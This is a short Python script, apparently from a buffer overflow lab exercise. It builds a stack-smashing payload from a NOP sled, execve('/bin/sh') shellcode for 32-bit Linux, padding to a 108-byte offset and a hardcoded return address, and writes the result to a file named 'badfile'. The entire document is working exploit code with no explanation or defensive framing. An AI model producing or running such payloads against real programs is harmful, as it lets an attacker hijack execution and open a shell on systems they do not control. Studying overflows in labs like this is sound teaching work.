import os
import struct

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80") 
offset = 108
buffer = 0xbffff190

# PAYLOAD
# [NOP][SHELLCODE][AA..AAA][RET]
# [          108          ][ 4 ]   

payload = '\x90'*60
payload += shellcode
payload += 'a'*(108-len(shellcode)-60)
payload += struct.pack("I",buffer)

f = open("badfile","a")
f.write(payload)
f.close()

